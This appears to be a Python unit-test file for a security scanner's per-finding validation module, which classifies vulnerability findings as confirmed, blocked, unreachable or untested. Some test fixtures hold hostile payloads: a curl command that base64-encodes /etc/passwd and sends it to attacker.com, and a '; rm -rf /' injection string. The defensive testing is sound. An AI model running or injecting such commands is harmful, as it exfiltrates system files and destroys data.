"""Unit tests for dast.per_finding — Tier 1.5 per-finding validation
(CONFIRMED / BLOCKED / UNREACHED / NOT_TESTED)."""

from __future__ import annotations

from dast.per_finding import (
    PerFindingValidation,
    _classify_rejection_rationale,
    _finding_id_for_index,
    _index_journal_by_finding,
    derive_per_finding_validation,
    effective_findings,
    per_finding_stats,
)


# ── _finding_id_for_index ────────────────────────────────────────────────────


def test_finding_id_format_matches_dast_runner_convention() -> None:
    """Must align with dast.runner._scan_result_to_l1_output's H001/H002/... format."""
    assert _finding_id_for_index(0) == "H001"
    assert _finding_id_for_index(9) == "H010"
    assert _finding_id_for_index(99) == "H100"


# ── derive_per_finding_validation ────────────────────────────────────────────


def test_derive_no_dast_findings_all_not_tested() -> None:
    l1 = [
        {"cwe": "CWE-78", "type": "command_injection", "severity": "critical", "line": 42, "confidence": 0.9},
        {"cwe": "CWE-89", "type": "sql_injection", "severity": "high", "line": 88, "confidence": 0.8},
    ]
    # No journal -> NOT_TESTED for everything not in confirmed list
    out = derive_per_finding_validation(l1, [])
    assert len(out) == 2
    assert out[0].finding_id == "H001"
    assert out[0].cwe == "CWE-78"
    assert out[0].status == "NOT_TESTED"
    assert out[1].finding_id == "H002"
    assert out[1].status == "NOT_TESTED"


def test_derive_some_confirmed() -> None:
    l1 = [
        {"cwe": "CWE-78", "type": "cmd", "severity": "critical", "line": 1, "confidence": 1.0},
        {"cwe": "CWE-89", "type": "sql", "severity": "high", "line": 2, "confidence": 0.8},
        {"cwe": "CWE-22", "type": "path", "severity": "medium", "line": 3, "confidence": 0.6},
    ]
    out = derive_per_finding_validation(l1, ["H001", "H003"])
    assert out[0].status == "CONFIRMED"
    assert out[1].status == "NOT_TESTED"  # no journal entry
    assert out[2].status == "CONFIRMED"


def test_derive_preserves_finding_attributes() -> None:
    l1 = [{"cwe": "CWE-78", "type": "x", "severity": "high", "line": 42, "confidence": 0.85}]
    out = derive_per_finding_validation(l1, ["H001"])
    r = out[0]
    assert r.cwe == "CWE-78"
    assert r.type == "x"
    assert r.severity == "high"
    assert r.line == 42
    assert r.confidence == 0.85


def test_derive_handles_missing_fields() -> None:
    l1 = [{}]  # totally empty finding
    out = derive_per_finding_validation(l1, [])
    r = out[0]
    assert r.cwe == ""
    assert r.line is None
    assert r.confidence is None


def test_derive_skips_non_dict_entries() -> None:
    l1 = [{"cwe": "CWE-78"}, "not a dict", None, {"cwe": "CWE-89"}]
    out = derive_per_finding_validation(l1, [])
    # Non-dict entries skipped — but indexing IS preserved (the dict at
    # index 0 gets H001, the dict at index 3 gets H004, not H002)
    assert len(out) == 2
    ids = [r.finding_id for r in out]
    assert ids == ["H001", "H004"]


def test_derive_empty_l1_returns_empty() -> None:
    assert derive_per_finding_validation([], []) == []
    assert derive_per_finding_validation([], ["H001"]) == []


def test_derive_extra_dast_ids_no_l1_match_ignored() -> None:
    """If DAST claims H005 confirmed but L1 only has 2 findings, H005 has nothing to match."""
    l1 = [{"cwe": "CWE-78"}, {"cwe": "CWE-89"}]
    out = derive_per_finding_validation(l1, ["H001", "H005"])
    assert out[0].status == "CONFIRMED"
    assert out[1].status == "NOT_TESTED"  # H002 has no journal entry


# ── Tier 1.5: rejection rationale classifier ────────────────────────────────


def test_classify_blocked_keywords() -> None:
    assert _classify_rejection_rationale(
        "validator rejected: input is sanitized via shlex.quote at line 42"
    ) == "BLOCKED"
    assert _classify_rejection_rationale(
        "rejected — query uses parameterized statement, sql injection blocked"
    ) == "BLOCKED"
    assert _classify_rejection_rationale(
        "user input is escaped before rendering; safe from XSS"
    ) == "BLOCKED"
    assert _classify_rejection_rationale(
        "the path is validated against an allowlist before file operations"
    ) == "BLOCKED"


def test_classify_unreached_keywords() -> None:
    assert _classify_rejection_rationale(
        "validator rejected: code path is unreachable from external input"
    ) == "UNREACHED"
    assert _classify_rejection_rationale(
        "couldn't trigger the vulnerable code path during sandbox execution"
    ) == "UNREACHED"
    assert _classify_rejection_rationale(
        "no input vector reaches this function; the sink is dead code"
    ) == "UNREACHED"
    assert _classify_rejection_rationale(
        "function never invoked from any reachable entry point"
    ) == "UNREACHED"


def test_classify_other_for_inconclusive() -> None:
    assert _classify_rejection_rationale(
        "validator rejected: insufficient evidence to confirm or refute"
    ) == "OTHER"
    assert _classify_rejection_rationale("rejected: hypothesis was inconclusive") == "OTHER"
    assert _classify_rejection_rationale("") == "OTHER"


def test_classify_blocked_takes_precedence_over_unreached() -> None:
    """If both keyword sets match, BLOCKED wins (defensive code is the
    more informative classification)."""
    text = "input is sanitized AND code path may be unreachable"
    assert _classify_rejection_rationale(text) == "BLOCKED"


# ── Journal indexing ─────────────────────────────────────────────────────────


def test_index_journal_picks_highest_priority_record() -> None:
    """When the same finding has multiple journal entries (multiple
    iterations or hypotheses), the indexer picks the most informative."""
    journal = [
        {"claim_id": "H001", "verdict": "rejected", "rationale": "short"},
        {"claim_id": "H001", "verdict": "confirmed", "rationale": "validator accepted"},
        {"claim_id": "H001", "verdict": "rejected", "rationale": "much longer rationale"},
    ]
    idx = _index_journal_by_finding(journal)
    # confirmed beats rejected
    assert idx["H001"]["verdict"] == "confirmed"


def test_index_journal_tiebreaks_by_rationale_length() -> None:
    """Two same-priority records — pick the one with more reasoning text."""
    journal = [
        {"claim_id": "H001", "verdict": "rejected", "rationale": "x"},
        {"claim_id": "H001", "verdict": "rejected", "rationale": "longer rejection text"},
    ]
    idx = _index_journal_by_finding(journal)
    assert idx["H001"]["rationale"] == "longer rejection text"


def test_index_journal_handles_empty() -> None:
    assert _index_journal_by_finding(None) == {}
    assert _index_journal_by_finding([]) == {}


# ── 4-status derivation with journal ─────────────────────────────────────────


def test_derive_with_journal_blocked_status() -> None:
    l1 = [{"cwe": "CWE-78", "confidence": 0.9}]
    journal = [
        {"claim_id": "H001", "verdict": "rejected",
         "rationale": "validator rejected: input is sanitized via shlex.quote"}
    ]
    out = derive_per_finding_validation(l1, [], journal)
    assert len(out) == 1
    assert out[0].status == "BLOCKED"
    assert out[0].rejection_reason and "shlex.quote" in out[0].rejection_reason


def test_derive_with_journal_unreached_status() -> None:
    l1 = [{"cwe": "CWE-22"}]
    journal = [
        {"claim_id": "H001", "verdict": "rejected",
         "rationale": "code path unreachable from any tested input"}
    ]
    out = derive_per_finding_validation(l1, [], journal)
    assert out[0].status == "UNREACHED"


def test_derive_with_journal_other_rejection_is_not_tested() -> None:
    """Rejection that doesn't match BLOCKED or UNREACHED keywords falls
    through to NOT_TESTED — neither defense nor unreachability proven."""
    l1 = [{"cwe": "CWE-89"}]
    journal = [
        {"claim_id": "H001", "verdict": "rejected",
         "rationale": "rejected: insufficient evidence"}
    ]
    out = derive_per_finding_validation(l1, [], journal)
    assert out[0].status == "NOT_TESTED"
    # But rejection_reason is preserved for surfacing
    assert out[0].rejection_reason == "rejected: insufficient evidence"


def test_derive_full_4_status_mix() -> None:
    """End-to-end: 4 L1 findings, one of each status."""
    l1 = [
        {"cwe": "CWE-78"},  # H001 -> CONFIRMED (in dast_findings)
        {"cwe": "CWE-89"},  # H002 -> BLOCKED (journal: sanitized)
        {"cwe": "CWE-22"},  # H003 -> UNREACHED (journal: dead code)
        {"cwe": "CWE-94"},  # H004 -> NOT_TESTED (no journal)
    ]
    journal = [
        {"claim_id": "H002", "verdict": "rejected",
         "rationale": "input is escaped before SQL execution"},
        {"claim_id": "H003", "verdict": "rejected",
         "rationale": "function is never invoked"},
    ]
    out = derive_per_finding_validation(l1, ["H001"], journal)
    assert [r.status for r in out] == ["CONFIRMED", "BLOCKED", "UNREACHED", "NOT_TESTED"]


def test_derive_confirmed_overrides_journal_rejection() -> None:
    """If finding_id is in dast_findings, it's CONFIRMED regardless of
    any journal records (they may be stale from earlier iterations)."""
    l1 = [{"cwe": "CWE-78"}]
    journal = [
        {"claim_id": "H001", "verdict": "rejected",
         "rationale": "earlier iteration said sanitized"}
    ]
    out = derive_per_finding_validation(l1, ["H001"], journal)
    assert out[0].status == "CONFIRMED"


# ── Tier 2 (v1.1): structured verdict precedence ────────────────────────────


def test_derive_refuted_verdict_maps_to_blocked() -> None:
    """`verdict=refuted` is the validator explicitly disproving the
    hypothesis based on sandbox observation. Maps to BLOCKED."""
    l1 = [{"cwe": "CWE-78"}]
    journal = [
        {"claim_id": "H001", "verdict": "refuted",
         "rationale": "sandbox observed the input never reached subprocess"}
    ]
    out = derive_per_finding_validation(l1, [], journal)
    assert out[0].status == "BLOCKED"


def test_derive_inconclusive_verdict_maps_to_not_tested() -> None:
    """`verdict=inconclusive` means sandbox couldn't decide either way."""
    l1 = [{"cwe": "CWE-89"}]
    journal = [
        {"claim_id": "H001", "verdict": "inconclusive",
         "rationale": "sandbox returned partial trace"}
    ]
    out = derive_per_finding_validation(l1, [], journal)
    assert out[0].status == "NOT_TESTED"


def test_derive_journal_confirmed_verdict_takes_priority_over_text() -> None:
    """Even if the rationale text would heuristic-match BLOCKED, a
    `confirmed` verdict overrides — the validator confirmed it."""
    l1 = [{"cwe": "CWE-78"}]
    journal = [
        {"claim_id": "H001", "verdict": "confirmed",
         "rationale": "input is sanitized but the bypass worked anyway"}
    ]
    out = derive_per_finding_validation(l1, [], journal)
    assert out[0].status == "CONFIRMED"


def test_derive_rejected_verdict_falls_through_to_text_classifier() -> None:
    """`rejected` is a hypothesis-quality fail, not a behavioral signal.
    Falls through to rationale text classifier — same Tier 1.5 path."""
    l1 = [{"cwe": "CWE-78"}, {"cwe": "CWE-89"}]
    journal = [
        {"claim_id": "H001", "verdict": "rejected",
         "rationale": "input is sanitized via shlex.quote at line 42"},
        {"claim_id": "H002", "verdict": "rejected",
         "rationale": "code path unreachable from external input"},
    ]
    out = derive_per_finding_validation(l1, [], journal)
    assert out[0].status == "BLOCKED"
    assert out[1].status == "UNREACHED"


# ── DAST-203: NOT_TESTED sub-reason classification ──────────────────────────


def test_not_planned_reason_when_no_journal_entry() -> None:
    """No journal record -> not_planned (orchestrator skipped)."""
    l1 = [{"cwe": "CWE-78"}]
    out = derive_per_finding_validation(l1, [], [])
    assert out[0].status == "NOT_TESTED"
    assert out[0].not_tested_reason == "not_planned"
    assert out[0].rejection_reason is None


def test_infra_stub_reason_when_sandbox_returns_stub() -> None:
    """DAST-203 case: sandbox returned stub trace -> infra_stub."""
    l1 = [{"cwe": "CWE-200"}]
    journal = [
        {"claim_id": "H001", "verdict": "rejected",
         "rationale": "Sandbox trace for H001 is a stub with no events (is_stub_no_trace=true)"}
    ]
    out = derive_per_finding_validation(l1, [], journal)
    assert out[0].status == "NOT_TESTED"
    assert out[0].not_tested_reason == "infra_stub"
    assert out[0].rejection_reason is not None
    assert "stub" in out[0].rejection_reason.lower()


def test_infra_stub_takes_precedence_over_blocked_keywords() -> None:
    """Even if rationale mentions 'sanitized' alongside the stub note,
    STUB classifier runs first — infra issue, not a defense observation."""
    l1 = [{"cwe": "CWE-78"}]
    journal = [
        {"claim_id": "H001", "verdict": "rejected",
         "rationale": "is_stub_no_trace=true; the input may be sanitized but couldn't verify"}
    ]
    out = derive_per_finding_validation(l1, [], journal)
    assert out[0].status == "NOT_TESTED"
    assert out[0].not_tested_reason == "infra_stub"


def test_inconclusive_reason_when_rationale_not_classifiable() -> None:
    """Rationale that doesn't match any classifier -> inconclusive."""
    l1 = [{"cwe": "CWE-89"}]
    journal = [
        {"claim_id": "H001", "verdict": "rejected",
         "rationale": "rejected: insufficient evidence to confirm or refute"}
    ]
    out = derive_per_finding_validation(l1, [], journal)
    assert out[0].status == "NOT_TESTED"
    assert out[0].not_tested_reason == "inconclusive"


def test_inconclusive_reason_for_inconclusive_verdict() -> None:
    """`verdict=inconclusive` directly maps to NOT_TESTED:inconclusive."""
    l1 = [{"cwe": "CWE-89"}]
    journal = [
        {"claim_id": "H001", "verdict": "inconclusive",
         "rationale": "sandbox returned partial trace"}
    ]
    out = derive_per_finding_validation(l1, [], journal)
    assert out[0].status == "NOT_TESTED"
    assert out[0].not_tested_reason == "inconclusive"


def test_not_tested_reason_is_none_for_non_not_tested_statuses() -> None:
    """CONFIRMED / BLOCKED / UNREACHED never set not_tested_reason."""
    l1 = [{"cwe": "CWE-78"}, {"cwe": "CWE-89"}, {"cwe": "CWE-22"}]
    journal = [
        {"claim_id": "H002", "verdict": "rejected", "rationale": "input is sanitized"},
        {"claim_id": "H003", "verdict": "rejected", "rationale": "path is unreachable"},
    ]
    out = derive_per_finding_validation(l1, ["H001"], journal)
    assert out[0].status == "CONFIRMED" and out[0].not_tested_reason is None
    assert out[1].status == "BLOCKED" and out[1].not_tested_reason is None
    assert out[2].status == "UNREACHED" and out[2].not_tested_reason is None


# ── PoC export — proof_of_concept + runtime_evidence on CONFIRMED ────────────


def test_confirmed_finding_surfaces_proof_of_concept_from_l1() -> None:
    """For CONFIRMED findings, the L1 vulnerability's proof_of_concept
    string should appear on the per-finding entry (demoable PoC)."""
    l1 = [{
        "cwe": "CWE-78",
        "type": "command_injection",
        "proof_of_concept": "curl http://attacker.com/?p=$(cat /etc/passwd | base64)",
        "confidence": 0.95,
    }]
    out = derive_per_finding_validation(l1, ["H001"], [])
    assert out[0].status == "CONFIRMED"
    assert out[0].proof_of_concept == "curl http://attacker.com/?p=$(cat /etc/passwd | base64)"


def test_confirmed_finding_surfaces_runtime_evidence_from_journal() -> None:
    """When DAST has a journal record for a CONFIRMED finding, surface
    its rationale as runtime_evidence."""
    l1 = [{"cwe": "CWE-78", "proof_of_concept": "; rm -rf /"}]
    journal = [
        {"claim_id": "H001", "verdict": "confirmed",
         "rationale": "Sandbox observed subprocess.run with shell=True invoked attacker payload"}
    ]
    out = derive_per_finding_validation(l1, ["H001"], journal)
    assert out[0].status == "CONFIRMED"
    assert out[0].proof_of_concept == "; rm -rf /"
    assert out[0].runtime_evidence is not None
    assert "subprocess.run" in out[0].runtime_evidence


def test_confirmed_finding_no_poc_when_l1_lacks_one() -> None:
    """L1 may not always produce a proof_of_concept (older runs, refusals).
    proof_of_concept stays None in that case."""
    l1 = [{"cwe": "CWE-78"}]  # no proof_of_concept field
    out = derive_per_finding_validation(l1, ["H001"], [])
    assert out[0].status == "CONFIRMED"
    assert out[0].proof_of_concept is None


def test_blocked_finding_does_not_surface_poc() -> None:
    """PoC is meaningless on BLOCKED — the attack didn't work. Don't
    surface it (would mislead users into thinking exploitation worked)."""
    l1 = [{
        "cwe": "CWE-78",
        "proof_of_concept": "; rm -rf /",
    }]
    journal = [
        {"claim_id": "H001", "verdict": "rejected",
         "rationale": "input is sanitized via shlex.quote"}
    ]
    out = derive_per_finding_validation(l1, [], journal)
    assert out[0].status == "BLOCKED"
    # PoC is suppressed for non-CONFIRMED statuses
    assert out[0].proof_of_concept is None


def test_poc_truncated_to_500_chars() -> None:
    """Defensive: very long PoCs (e.g., embedded large payloads) get
    truncated so the launch report stays readable."""
    long_poc = "A" * 1000
    l1 = [{"cwe": "CWE-78", "proof_of_concept": long_poc}]
    out = derive_per_finding_validation(l1, ["H001"], [])
    assert out[0].proof_of_concept is not None
    assert len(out[0].proof_of_concept) == 500


# ── PerFindingValidation.to_dict ─────────────────────────────────────────────


def test_to_dict_round_trip() -> None:
    r = PerFindingValidation(
        finding_id="H001", cwe="CWE-78", type="cmd", severity="high",
        line=42, status="CONFIRMED", confidence=0.9,
    )
    d = r.to_dict()
    assert d["finding_id"] == "H001"
    assert d["cwe"] == "CWE-78"
    assert d["status"] == "CONFIRMED"
    assert d["confidence"] == 0.9


# ── effective_findings (CONFIRMED-only filter for Effective CWE F1) ──────────


def test_effective_findings_filters_to_confirmed() -> None:
    l1 = [
        {"cwe": "CWE-78"},
        {"cwe": "CWE-89"},
        {"cwe": "CWE-22"},
    ]
    per_finding = [
        PerFindingValidation("H001", "CWE-78", "x", "high", 1, "CONFIRMED", 0.9),
        PerFindingValidation("H002", "CWE-89", "x", "high", 2, "BLOCKED", 0.7),
        PerFindingValidation("H003", "CWE-22", "x", "low", 3, "CONFIRMED", 0.5),
    ]
    eff = effective_findings(l1, per_finding)
    # Only CONFIRMED by default
    assert len(eff) == 2
    assert eff[0]["cwe"] == "CWE-78"
    assert eff[1]["cwe"] == "CWE-22"


def test_effective_findings_with_blocked_includes_them() -> None:
    """include_blocked=True surfaces real-but-mitigated vulns for
    defense-in-depth audits."""
    l1 = [{"cwe": "CWE-78"}, {"cwe": "CWE-89"}, {"cwe": "CWE-22"}]
    per_finding = [
        PerFindingValidation("H001", "CWE-78", "x", "high", 1, "CONFIRMED", 0.9),
        PerFindingValidation("H002", "CWE-89", "x", "high", 2, "BLOCKED", 0.7),
        PerFindingValidation("H003", "CWE-22", "x", "low", 3, "UNREACHED", 0.5),
    ]
    eff = effective_findings(l1, per_finding, include_blocked=True)
    assert len(eff) == 2  # CONFIRMED + BLOCKED, NOT UNREACHED
    cwes = {f["cwe"] for f in eff}
    assert cwes == {"CWE-78", "CWE-89"}


def test_effective_findings_accepts_dict_form() -> None:
    """When loaded from saved JSON, per_finding is dicts not dataclasses."""
    l1 = [{"cwe": "CWE-78"}, {"cwe": "CWE-89"}]
    per_finding_dicts = [
        {"finding_id": "H001", "status": "CONFIRMED"},
        {"finding_id": "H002", "status": "UNTESTED"},
    ]
    eff = effective_findings(l1, per_finding_dicts)
    assert len(eff) == 1
    assert eff[0]["cwe"] == "CWE-78"


def test_effective_findings_empty_when_none_confirmed() -> None:
    l1 = [{"cwe": "CWE-78"}]
    per_finding = [PerFindingValidation("H001", "CWE-78", "x", "high", 1, "NOT_TESTED", 0.5)]
    assert effective_findings(l1, per_finding) == []


# ── per_finding_stats ────────────────────────────────────────────────────────


def test_stats_basic() -> None:
    records = [
        PerFindingValidation("H001", "CWE-78", "x", "high", 1, "CONFIRMED", 0.9),
        PerFindingValidation("H002", "CWE-89", "x", "high", 2, "CONFIRMED", 0.8),
        PerFindingValidation("H003", "CWE-22", "x", "med", 3, "BLOCKED", 0.5),
        PerFindingValidation("H004", "CWE-94", "x", "med", 4, "NOT_TESTED", 0.6),
    ]
    s = per_finding_stats(records)
    assert s["n_findings"] == 4
    assert s["n_confirmed"] == 2
    assert s["n_blocked"] == 1
    assert s["n_unreached"] == 0
    assert s["n_not_tested"] == 1
    assert s["n_untested"] == 2  # legacy field — total - confirmed
    assert s["confirmed_pct"] == 50.0
    assert s["blocked_pct"] == 25.0


def test_stats_empty() -> None:
    s = per_finding_stats([])
    assert s["n_findings"] == 0
    assert s["confirmed_pct"] == 0.0


def test_stats_all_confirmed() -> None:
    records = [
        PerFindingValidation("H001", "CWE-78", "x", "high", 1, "CONFIRMED", 0.9),
        PerFindingValidation("H002", "CWE-89", "x", "high", 2, "CONFIRMED", 0.8),
    ]
    s = per_finding_stats(records)
    assert s["confirmed_pct"] == 100.0


def test_stats_accepts_dict_form() -> None:
    s = per_finding_stats([
        {"finding_id": "H001", "status": "CONFIRMED"},
        {"finding_id": "H002", "status": "NOT_TESTED"},
    ])
    assert s["n_confirmed"] == 1
    assert s["n_not_tested"] == 1
    assert s["confirmed_pct"] == 50.0
